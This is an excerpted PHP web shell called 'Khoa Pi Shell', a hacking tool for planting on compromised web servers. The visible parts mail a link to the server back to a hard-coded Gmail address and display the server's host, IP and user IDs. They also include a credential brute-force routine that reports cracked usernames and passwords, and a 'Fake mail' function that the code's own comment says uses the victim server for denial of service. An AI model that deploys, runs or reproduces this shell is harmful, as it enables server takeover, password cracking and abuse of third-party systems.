...
$to_email = 'namtuocbongdemhk@gmail.com';
...
@mail($to_email, $server_mail, $linkcr, $header);
            ...
            p('<body background-color: #333333;>
<BR><BR><div align=center><font color=yellow face=tahoma size=2>Welcome Shell  Hacker - Please Wait...<BR></div>');
            exit;
        }
...
<title><?php echo str_replace('.','','[Khoa Pi Shell]');?></title>
<style type="text/css">
body,td{font: 10pt Tahoma;color:#99CC33;line-height: 16px;}

a {color: #99CC33;text-decoration:none;}
a:hover{color: #f00;text-decoration:underline;}
.alt1 td{border-top:1px solid #99CC33;border-bottom:1px solid #99CC33;background:#0E0E0E;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid #99CC33;border-bottom:1px solid #99CC33;background:#f9f9f9;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid #99CC33;border-bottom:0px solid #99CC33;background:#0E0E0E;padding:5px 10px 5px 5px;}
.fout1 td{border-top:1px solid #99CC33;border-bottom:0px solid #99CC33;background:#0E0E0E;padding:5px 10px 5px 5px;}
.fout td{border-top:1px solid #99CC33;border-bottom:0px solid #99CC33;background:#202020;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid #99CC33;border-bottom:1px solid #99CC33;background:#202020;padding:5px 10px 5px 5px;font-weight:bold;}
.head_small td{border-top:1px solid #99CC33;border-bottom:1px solid #99CC33;background:#202020;padding:5px 10px 5px 5px;font-weight:normal;font-size:8pt;}
...
<table width="100%" border="0" cellpadding="0" cellspacing="0">
    <tr class="head_small">
        ...
        <table width=100%><tr class="head_small"><td  width=86px align="center" background=""><p><a title="Khoa Pi Shell" href="<?php $self;?>">
         COPYRIGHT (C) 2012 
              </td>
       
        <span style="float:right;"> <?php echo "Hostname: ".$_SERVER['HTTP_HOST']."";?>  | <a href="http://google.com" target="_blank"><a href="http://google.com" target="_blank"><?php echo str_replace('.','','WwW.google.com');?></a> Version 2.3</a> | <a href="javascript:goaction('logout');"><font color=#99CC33>Logout</font></a></span>
        <?php
...
echo "<font color=white>Server</font>: ".@substr($SERVER_SOFTWARE,0,120)." - <font color=white>id</font>: ".@getmyuid()."(".@get_current_user().") - uid=".@getmyuid()." (".@get_current_user().") gid=".@getmygid()."(".@get_current_user().")<br>";
    ...
    <tr class="alt1">
        <td  width=100% background=""><span style="float:right;">[Server IP: <?php echo "<font color=yellow>".gethostbyname($_SERVER['SERVER_NAME'])."</font>";?> - Your IP: <?php echo "<font color=yellow>".$_SERVER['REMOTE_ADDR']."</font>";?>] </span>
            ...
            <?php }?> |<a href="?id=fake-mail"><font face="Tahoma" size="2" color="#99CC33"> <span style="text-decoration: none">Fake mail</span></font></a></b></td>
    </tr>
</table>
...
Type:'.$DriveTypeDB[$drive->DriveType].'">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
    ...
    p('<tr bgcolor="green" stlye="border-top:1px solid #99CC33;border-bottom:1px solid #99CC33;"><td colspan="6" height="5"></td></tr>');
...
p("<b>[ namtuocbongdemhk@gmail.com ]# </b>
...
p("<b>[ namtuocbongdemhk@gmail.com ]# </b><b>Attacking has been done!</a> Username: <font color='#FF0000'> $user </font> / Password:<font color='#FF0000'> $pass </font></b><br>");}curl_close($ch);}

if(isset($submit) && !empty($submit)){

$userlist = explode ("\n" , $users );
$passlist = explode ("\n" , $pass );
p('<b>[ namtuocbongdemhk@gmail.com ]# Attacking ...</font></b><br>');
...
//fake mail = Use victim server 4 DOS - fake mail 
        ...
        echo "<script language='javascript'> alert('Loading - please waite ...')</script>";
        }
        }
        //***
?></td>
...
<div style="padding:10px;border-bottom:1px solid #0E0E0E;border-top:1px solid #0E0E0E;background:#0E0E0E;">
    ...
    <a href="http://google.com" target="_blank">COPYRIGHT (C) 2012</a><strong> </strong><B> </div>
</body>
</html>
...
<body bgcolor=black background-color: #333333;>

        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Khoa Pi Shell</title>
<style type="text/css">
...
<div>
<font color=#99CC33>
<font color=yellow>==[ <B>SHELL vhb</B> ]== </font><BR><BR>
...
?>
    ...
    <B><font color=red>
<a href=http://google.com.vn target=_blank>Hacking</a><BR></b>
